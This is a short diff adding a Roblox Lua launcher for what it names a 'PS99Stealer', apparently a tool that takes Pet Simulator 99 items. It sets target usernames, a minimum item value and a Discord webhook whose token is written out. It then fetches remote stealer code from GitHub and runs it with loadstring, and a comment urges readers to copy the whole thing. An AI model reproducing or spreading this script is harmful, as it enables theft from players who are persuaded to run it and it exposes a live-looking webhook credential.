@@ -1,0 +1,6 @@
+Username = "roblox_user_7230543357"
+Username2 = "roblox_user_7230543357"
+MinimumRAP = 10000
+Webhook = "https://discord.com/api/webhooks/1349650412944494604/DDTpEiEfQt0w_Hde5e8nsDTYF930XCtFs_p7aH-4Lk36S2gE5GB0dnFKE4otJ5Yt4lxM"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/TraxStealer/refs/heads/main/PS99Stealer", true))() -- copy the whole thing, even the username =
